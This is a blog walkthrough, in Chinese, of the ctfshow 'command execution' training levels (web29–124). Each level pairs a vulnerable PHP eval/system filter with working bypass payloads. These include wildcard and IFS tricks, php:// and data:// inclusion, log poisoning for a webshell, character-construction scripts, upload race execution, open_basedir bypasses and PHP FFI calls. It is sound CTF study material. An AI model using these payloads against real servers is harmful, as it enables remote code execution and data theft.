---
title: Web入门_命令执行
author: Creexile
date: 2024-07-04
lastMod: 2024-07-05
summary: '除了部分Web都挺萌新的'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [RCE, PHP, 工具, PHP-FFI, 文件包含, PHP内置变量, CTF]
---

# 命令执行

---

web29-77, web118-119

## web29

- 描述: 命令执行，需要严格的过滤

仅仅过滤了flag,利用通配符绕过

```php
if(!preg_match("/flag/i", $c)){
        eval($c);
    }
```

payload如下, 传递后查看源码即可

```
?c=system('ls');
?c=system('cat fla*');
```

## web30

- 描述: 命令执行，需要严格的过滤

过滤了system, php, 只需要换执行函数就可以了, 比如passthru

```php
if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
```

payload如下 传递后查看源码即可

```
?c=passthru(ls);
?c=passthru('cat f*');
```

## web31

- 描述: 同上

cat, 空格, sort, shell, 点和单引号也过滤了, 同理可以换成tac等

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
```

payload如下

```bash
?c=passthru(ls);
# 都行
?c=passthru("tac%09f*");
?c=echo%09`tac%09f*`;
# 获取文件和目录信息并且颠倒顺序, 获取颠倒顺序后的数组的第二个元素并显示该文件源代码
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
# 获取当前工作目录中的第三个文件, 然后显示该文件的源代码
?c=show_source(scandir(getcwd())[2]);
?c=eval($_GET[1]);&1=system('tac flag.php');
```

## web32

- 描述: 同上

过滤越来越多, echo, 反引号, 分号,左括号也过滤了

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
```

那就换成以`?>`结尾的语句, 实在想不到怎么绕过还可以把本题变成文件包含

payload如下:

```
?c=include$_GET["a"]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
?c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

还可以用data伪协议执行php代码:

```
?c=include$_GET["a"]?>&a=data://text/plain,<?php%20phpinfo();?>
```

> 可以包含日志文件进行写马

## web33

- 描述: 同上

过滤了双引号, 但是非常地可惜, 因为`$_GET[]$`去掉了双引号也可以用

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
```

payload:

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

## web34

- 描述: 同上

冒号也没了, 无所谓, 继续利用我们上一题payload

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
```

## web35

- 描述: 同上

真帅吧, 过滤`<`和`=`, 但是您猜怎么着?我们是传参用的=而不是在参数内部用的=, 所以不会被过滤

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
```

payload:

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

## web36

- 描述: 同上

过滤`0-9`, payload没有变, 继续梭哈, 这类题目就算进化到头了, payload同上

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
```

## web37

- 描述: 同上

似乎不是原来的题目了, 变为了文件包含类的文件执行, 仅包含了flag

```php
if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    }
```

伪协议加上通配符绕过过滤, 或者编码绕过也行

```
?c=data://text/plain,<?php system('cat fl*')?>
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

还可以用UA头文件包含, nginx的默认日志位置为`/var/log/nginx/access.log`

![image-20240703165620132](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240703165620132.png)

进行日志包含, 用蚁剑连接, 得到flag

```
?c=/var/log/nginx/access.log
```

![image-20240703165546051](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240703165546051.png)

## web38

- 描述: 同上

增加过滤`php`和`file`, 不知道啊, 我用data的

```php
if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    }
```

payload:

```
?c=data://text/plain,<?=system('tac f*)?>
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
# 日志包含
```

> 短标签真不错, 有`<?=...?>`和`<?...?>`两种, 其中前一种在PHP7以上不管short_open_tag配置是不是开启的, 都可以使用

## web39

- 描述: 同上

限定后缀名, 一般是截断, 闭合或者是注释掉后面的内容

```php
if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
```

payload

```
?c=data://text/plain,<?php system('cat fl*')?>)?><?php
?c=data://text/plain,<?php system('cat fl*')?>	# 问就是已经闭合了
```

## web40

- 描述: 同上

知道为什么括号那里看着这么宽吗, 因为是中文的

```php
if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
```

payload:

```
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=session_start();system(session_id());

还可以是  ?c=eval(array_pop(next(get_defined_vars())));
然后POST传参  b=system(''tac flag.php)
```

## web41

- 描述: 过滤不严，命令执行

过滤了`$、+、-、^、~`使得异或自增和取反构造字符都无法使用了那就只能用`|`了

```php
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
```

构造脚本如下:

```python
import re
import urllib
from urllib import parse

hex_i = ""
hex_j = ""
pattern = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/'
# 上面是写入题目的正则表达式

str1 = ["system", "cat flag.php"]
# 这是想要的到的字符串

for p in range(2):
    t1 = ""
    t2 = ""
    for k in str1[p]:
        for i in range(256):
            for j in range(256):
                if re.search(pattern, chr(i)):
                    break
                if re.search(pattern, chr(j)):
                    continue
                if i < 16:
                    hex_i = "0" + hex(i)[2:]
                else:
                    hex_i = hex(i)[2:]
                if j < 16:
                    hex_j = "0" + hex(j)[2:]
                else:
                    hex_j = hex(j)[2:]
                hex_i = '%' + hex_i
                hex_j = '%' + hex_j
                c = chr(ord(urllib.parse.unquote(hex_i)) | ord(urllib.parse.unquote(hex_j)))
                if (c == k):
                    t1 = t1 + hex_i
                    t2 = t2 + hex_j
                    break
            else:
                continue
            break
    print("(\"" + t1 + "\"|\"" + t2 + "\")")
# system('ls'), ('system')('ls'), (system)('ls'), ('system')(ls) 都可以执行
# 使用构造的字符串时应该按照以下格式:system=("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")
# 其中%13|%60=s ,%19|%60=y ...
# 上面运行的输出格式是:
# ("%13%19%13%14%05%0d"|"%60%60%60%60%60%60") ----- system
# ("%0c%13"|"%60%60") ----- ls
# 直接拼接即可,记得使用bp类工具,hackbar会被再次编码
```

payload:

```
# (system)(ls)
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60") ("%0c%13"|"%60%60")

# (system)(cat flag.php)
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60")
```

## web42

- 描述: 命令执行，需要严格的过滤

似乎被[重定向](https://www.cnblogs.com/tinywan/p/6025468.html), `>/dev/null 2>&1` 命令表示不回显, 要让命令回显, 可以进行命令分隔, 以此来绕过

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
```

```
?c=cat flag.php ||	# 理论上 ; , | , || , & , && 都可以用, 测试得到 ; 和 || 可用
?c=cat flag.php%0a	# 换行
```

## web43

- 描述: 同上

解决方案就是换个函数, 就过滤了分号和cat而已

```php
if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

payload:

```
?c=tac flag.php%0a
?c=tac flag.php ||
```

## web44

- 描述: 同上

```php
if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

通配符即可, payload:

```
?c=tac fla*%0a
?c=tac fla* ||
```

## web45

- 描述: 同上

过滤空格, 换一个就行

```php
if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

payload:

```
?c=tac%09fla*%0a
?c=tac%09fla*||
```

## web46

- 描述: 同上

上强度了, 但是通配符还有`?`(没成功), 或者直接`\`隔开, 空格还有`<`之类的代替

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

payload

```
?c=tac<fla\g.php||
```

## web47

- 描述: 同上

没什么影响, 那就继续用上一题payload

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

## web48

- 描述:同上

诶还是没有, 那就继续用

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

> 以上这些都能读文件/执行命令

## web49

- 描述: 命令执行，需要严格的过滤

这又是什么power了?

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

payload:

```
?c=tac<fla\g.php||
```

## web50

- 描述: 同上

`\x09`是tab键, `\x26`是&

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

payload

```
?c=tac<fla\g.php||
```

> 不是哥们, 真就一把梭啊

## web51

- 描述: 同上

这下老实了,不给用`\`和`tac`了, 那就换一个`''`和`nl`, 然后查看源码

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

payload

```
?c=nl<fla''g.php||
```

## web52

- 描述: 同上

现在`<`和`>`也没了, 但是`$`限时回归,对它使用`${IFS}`吧

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
```

抓到本目录文件下, 却发现flag不见了, 怎么一回事呢, 原来是去了根目录

```
?c=nl${IFS}fla''g.php||
```

payload

```
?c=nl${IFS}/fla''g||
```

## web53

- 描述: 同上

怎么把重定向去了?

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
```

payload:

```
?c=nl${IFS}fla''g.php
```

## web54

- 描述: 同上

这又是哪里来的强者了!`|.*f.*l.*a.*g.*|`这种过滤就是字母不能按过滤的顺序出现

```php
if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
```

杜绝了字符拼接, 但是过滤似乎少了个通配符`?`, payload:

```
?c=/bin/?at${IFS}f???.php
```

至于为什么要加上/bin, 因为不是这/bin下似乎还有其他类似的命令, 执行不了cat

> Linux 的很多命令存放在 /bin/ 目录下，且可以通过绝对路径来使用，而且支持通配符

## web55

- 描述: 同上

返璞归真, 这下彻底是无字母了; 空格, `.`和`?`限时回归

```php
// 你们在炫技吗?
if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
```

找到了三种方案:

1. 我们可以通过post一个文件(文件里面的sh命令), 在上传的过程中, 通过`.`去执行执行这个文件(形成了条件竞争); 一般来说这个文件在linux下保存在`/tmp/php??????`, 一般后面的6个字符是随机生成的有大小写(可以通过linux的匹配符去匹配); [原文](https://blog.csdn.net/qq_46091464/article/details/108513145)以及[P神文章](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
2. 利用`/bin/`目录下的`base64`进行通配符匹配, 获得flag.php文件的base64编码
3. 利用`/usr/bin/`下的`bzip2`命令，先将flag.php文件进行压缩, 然后再将其下载

先从最简单的第二种和第三种开始:

### 第二种

```
?c=/???/????64 ????.???
```

只需要将所有字母换成通配符`?`即可, 得到的字符串进行base64解码就能得到flag, 伟大, 无需多言

![image-20240705143515362](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240705143515362.png)

### 第三种

```
?c=/???/???/????2 ????.???
```

同理,然后访问`/flag.php.bz2`下载该文件

![image-20240705143904045](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240705143904045.png)

> 需要注意的是, 压缩后似乎原文件没了, 如果到这里你还想复现下一个, 你得重启环境

### 第一种

前置知识:

- Linux 中 `.`(点)命令, 或者叫period, 它的作用和 `source` 命令一样, 就是用当前的shell执行一个文件中的命令; 通过`.`去执行sh命令并不需要有执行权限
- 只要是PHP网站都可以用上传的方式(默认行为)
- ascii码表中, 大写字母位于`@`与 `[`之间, 所以`[@-[]`是为了匹配所有大写字母

首先本地创建一个html文件便于构造一个post上传文件的数据包

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>POST数据包POC</title>
  </head>
  <body>
    <form
      action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/"
      method="post"
      enctype="multipart/form-data"
    >
      <!--链接是当前打开的题目链接-->
      <label for="file">文件名：</label>
      <input type="file" name="file" id="file" /><br />
      <input type="submit" name="submit" value="提交" />
    </form>
  </body>
</html>
```

选择一个文件并上传后抓上传包, 然后进行修改

```
# 修改GET部分:
?c=.+/???/????????[@-[]

# 修改包部分:
#!/bin/sh
ls
```

![image-20240705154443371](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240705154443371.png)

至于为什么有时候没有回显, 因为正则匹配的是全大写字母,如果部分是小写字母会匹配不上

最后直接将ls修改为`cat flag.php`就可以拿到flag了

> 这种方法同样适用于PHP5的时候构造无字母(因为PHP5并不像PHP7支持`($a)();`这样的方法来执行动态函数, 也就是不支持取反异或等操作)
>
> p神文章提及了glob通配符(问号也包括在内)的其他使用方法, 例如排除掉某一个位置的特性字符

## web56

- 描述: 同上

掌握了上述三种方法, 我相信你可以完成这题: 无数字无字母就只能用上题的第一种方法了

```php
// 你们在炫技吗?
if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
```

## web57

- 描述: 命令执行，需要严格的过滤，已测试，可绕

有时候我十分佩服出题人, 现在`.`都没了, 这下老实了?哦只需要构造36

```php
// 还能炫的动吗？
//flag in 36.php
if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
```

第一种方法用的是`$(())`的运算, 至于[其他类似括号](https://blog.csdn.net/u013402321/article/details/80333272)

```
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

简单来说，`$(())` 用来做数学运算, 其中`$((${_}))=0`, `$((~$((${_}))))=-1`, 所以我们是拼接出-37在进行取反

> 似乎js也有类似的东西, 不过构造的可以是命令, 比如输出个flag什么的

## web58

- 描述: 命令执行，突破禁用函数

```php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
```

这不就POST嘛, 但是我错了, 他给我`passthru(), system(),`甚至是反引号都禁了

怎么办呢, 我用字典扫发现flag.php在本目录下, 只能看看有没有一些函数了, 你别说还真有

```
c=echo file_get_contents("flag.php");
c=readfile("flag.php");
c=var_dump(file('flag.php'));
c=highlight_file("flag.php");
c=show_source("flag.php");
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}	#一行一行读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}	#一行一个一个字符取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
```

还有伪协议也是可以的

```
c=include($_GET['url']);	# POST
/?url=php://filter/read=convert.base64-encode/resource=flag.php	# GET
# 或者直接POST:
c=include "php://filter/read=convert.base64-encode/resource=flag.php";
```

## web59

- 描述: 同上

改的是后台过滤, 不会写在前端, 前端同上一题,不写了

结果也没过滤多什么, 直接试试上一题的payload就可以了

```
c=include "php://filter/read=convert.base64-encode/resource=flag.php";
```

## web60-web65

- 描述: 同上

解题方法也是同上, 看来是直接玩死了

## web66-70

- 描述: 懒得写

我还以为payload不能用了, 原来是flag换地方了(扫描器扫不到了), 现在在根目录而且叫做`flag.txt`了

```
c=include('/flag.txt');
c=highlight_file('/flag.txt');
```

## web71

- 描述: 命令执行，突破禁用函数，求你们别秀了

```php
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
```

> `$s = ob_get_contents();` 这一句的作用是定义了一个s变量并把`ob_get_contents()`返回的输出缓冲区的内容赋值给了s
>
> `ob_end_clean();`这个函数的作用是以字符串格式返回当前输出缓冲区并关闭输出缓冲, 此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在`ob_end_clean()`之前调用`ob_get_contents()`，因为当调用`ob_end_clean()`时缓冲区内容将被丢弃
>
> `echo preg_replace("/[0-9]|[a-z]/i","?",$s);`
> 这一句话是把变量s，即缓冲区内容的所有的数字和字母替换成了为?

似乎对缓冲区进行了一些运算, 显示出来的文件全都是乱码, 但是我们可以直接让后面的代码不执行:

你问我为什么知道是`include('/flag.txt');`?你看,这不是前面用了吗

```
c=include('/flag.txt');exit(0);
```

或者进行一次反向操作得到源代码

```python
import requests

url = "http://c5ec61c2-5fd3-4973-8277-71d0522d966d.challenge.ctf.show/"

d = {'c': 'include("/flag.txt");echo ~ob_get_contents();'}
s = requests.post(url, d).content

for i in s:
    print(chr(~i & 0xff), end='')
```

真想要执行类似ls的?

```
c=var_export(scandir("/"));exit();	# 根目录
c=var_export(scandir("./"));exit();	# 当前目录
```

> 从这里开始就像是打ctf的情况了, 前置是一点不会, 全靠在网上找原理找相似题目, 我的建议是做好心理准备

## web72

- 描述: 命令执行，突破禁用函数，求你们别秀了

```php
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
```

压根没有变?可是我的flag呢?我的flag哪里去了?

偷偷你的web71, 你尝试访问根目录的时候会发现`Operation not permitted`, 权限也没了

```
c=var_export(scandir("./"));exit();
```

本题设置了`open_basedir()`, 以及限制了`ini_set()`, 现在是将php所能打开的文件限制在指定的目录树中(指定为`/var/www/html`), 包括文件本身; 而且还不能通过`ini_set()`重新设置这个属性([对应博客](https://www.freesion.com/article/5349629378/))

解决这个问题给到的payload是:

```
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```

我不是很懂这个怎么来的

```php
# 详解:
<?php
$a=new DirectoryIterator("glob:///*");
	# 利用DirectoryIterator($path)可以实现遍历目录下的所有文件
	# glob:// — 查找匹配的文件路径模式
	# DirectoryIterator("glob:///*")   遍历根目录里所有文件
foreach($a as $f)  	#循环遍历输出，并以空格为分隔
{echo($f->__toString().' ');
} exit(0);
?>
```

> eval()里的语句可以视为在当前php文件里加了几条语句, 这些语句必须是完整的, 即必须以";", 或者"?>"结尾来结束语句, 但是eval里的"?>"不会闭合当前php文件

ctfshow提供的这道题的poc(一个绕过安全目录的脚本): 说是利用了php的垃圾回收,我这里干脆就贴别人写的[文章](https://blog.csdn.net/m0_48780534/article/details/125095560)得了,我看不懂这段代码原理

## web73

- 描述: 同上

没给源码, 但是看报错应该是差不多的, 也是`open_basedir()`, 以及限制了`ini_set()`

可是却可以直接执行以下代码获取根目录文件, 那看来是形同虚设

```
c=var_export(scandir("/"));exit();
```

直接尝试包含本题的flag: flagc.txt, 成功执行拿到flag

```
c=include('/flagc.txt');exit();
```

## web74

- 描述: 同上

也没给源码, 报错也一样, 那我们继续试之前的payload, 结果发现不能用了, 测试发现是因为`scandir()`被限制了

那就用web72提供的代码好了, 可以得到本次的flag是flagx.txt

```
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```

直接尝试进行include, 发现可以执行, 那就拿到了flag

```
c=include('/flagx.txt');exit();
```

## web75-web76

- 描述: 同上

帮你试过了, 还是得用上面web72的脚本, 本次的flag叫做flag36.txt; 但是`open_basedir`给你整麻了, 不能include了

然后web72的那个脚本也不行了, 不清楚原因, 只能求助于wp:

```
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
```

浅浅分析: [大佬博客](https://blog.csdn.net/m0_48780534/article/details/125095560)

> 如果想要知道数据库名字似乎要从前面的题目获取

PDO 为PHP访问数据库定义了一个轻量级的一致接口，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。`new PDO($dsn, $user, $pass);`

```php
try {
	$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
	# 在MySQL中,load_file(完整路径)函数读取一个文件并将其内容作为字符串返回。
	foreach($dbh->query('select load_file("/flag36.txt")') as $row)
	{
		echo($row[0])."|";
	}
	$dbh = null;
}catch (PDOException $e) {
	echo $e->getMessage();exit(0);
}
exit(0);
```

## web77

- 描述: 没有

源码也没有, 哦牛皮; 直接开套, 得到本题flag为flag36x.txt

```
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```

然后来看看远处的wp吧朋友们, payload:

```
c=$ffi = FFI::cdef("int system(const char *command);");$a='/readflag > 1.txt';$ffi->system($a);
```

FFI(Foreign Function Interface), 即外部函数接口, php7.4以上才有, [php官方解析](https://www.php.net/manual/zh/ffi.cdef.php)

FFI指在一种语言里调用另一种语言代码的技术; PHP的FFI扩展就是一个让你在PHP里调用C代码的技术, 上面的payload解释如下, 访问1.txt即可得到flag

```php
$ffi = FFI::cdef("int system(const char *command);");	//创建一个system对象
$a='/readflag > 1.txt';	//没有回显，所以将内容输出到1.txt
$ffi->system($a);	//通过$ffi去调用system函数
```

## web118

- 描述: flag in flag.php, by yu22x

[web118详解](https://blog.csdn.net/Myon5/article/details/140145005)

通过单个字符爆破登录框得到可用的字符, 其中包括大括号, 冒号, 问号和部分字母

利用内置变量的切片, 可以切出我们想要的字符; 拼接起来组合成命令`nl`

```
${PATH:~Q}${PWD:~Q} ????.???
```

其中, `~`是从字符串末尾开始切片, 我们只需要最后那个字母, 所以只需要`~0`; 而任意的大小写字母与数字0等效, 选一个可用的字母即可

> `$PWD`应该是`/var/www/html`, 取l; `$PATH`最后一个单词肯定是`bin`, 取n

![image-20241009195813055](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241009195813055.png)

还有另一种比较长的

```
${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
```

在Bash中，`${#var}`的语法用于获取变量 `var` 的长度, 其实就是将这些数字应用到切片中去，绕过对数字的过滤

## web119

- 描述: 无

过滤了PATH和BASH

同理, 用上面的内置变量加切片的方法绕过过滤, 构造我们想要的命令

> `${HOME:${#HOSTNAME}:${#SHLVL}}` == t
>
> `${PWD:${Z}:${#SHLVL}}` == /
>
> `$RANDOM`会生成一个随机数, 这个数字是4到5位, 结合上面我们可以得到数字4或5

```
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
# /bin/cat flag.php

${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
# /bin/base64 flag.php
```

还可以继续用`nl`(题目环境不允许, 不是解题方法), 查一下怎么输出所有内置变量然后去构造

`$LANG = en_US.UTF-8`, 这里还有个n, 切片方法为`${LANG:${#SHLVL}:${#SHLVL}}`

```
${LANG:${#SHLVL}:${#SHLVL}}${PWD:~Q} ????.???
```

## web120

- 描述: by yu22x

给源码了; 过滤HOME, base64的payload可以继续使用, 这次构造的是a而不是t

```
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
# /bin/cat flag.php
```

这次需要查看网页源代码才能搜索到ctfshow

## web121

- 描述: by yu22x 师傅们 留口饭吃

过滤了~, SHLVL, 限制了长度小于65; SHLVL被过滤, 我们使用`${#?}`或`${##}`代替

base64的读取只需要稍作修改

```
${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???
```

还可以用`/bin/rev`, 即`rev`, 将文件内容读取并进行反转

```
${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
```

## web124

- 描述: RCE

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45
*/
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

过滤了一些符号, 使用的字母必须是数学函数的白名单里的字母, 长度不能大于80

我们可以通过`$_GET[]`传参来绕过过滤, `[]`可以用`{}`代替, 再利用进制转换来构造我们需要的字符

- `base_convert` : 在任意进制之间转换数字。
- `hexdec` : 把十六进制转换为十进制。
- `dechex` : 把十进制转换为十六进制。
- `hex2bin` : 把十六进制的字符串转换为ASCII码
  > 没有`hex2bin`需要使用`base_convert`构造出来

需要两个参数, 一个传递函数名, 一个传递函数参数值:

```
$_GET{abs}($_GET{acos})
```

接下来构造`_GET`:

`_GET`转成十六进制是`0x5f474554`, 由十六进制转为十进制`1598506324`

```
_GET == hex2bin(dechex(1598506324))
# 没有hex2bin, 构造它
base_convert(37907361743,10,36) == hex2bin
# 得到:
_GET == base_convert(37907361743,10,36)(dechex(1598506324))
# 避免超长, 变量都选择最短的:
$pi=base_convert(37907361743,10,36)(dechex(1598506324))
```

> 这里base_convert写36进制, 是为了能把所有字符都表示进来, 10+26=36

payload:

```
POST:
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&abs=system&acos=cat flag.php
```
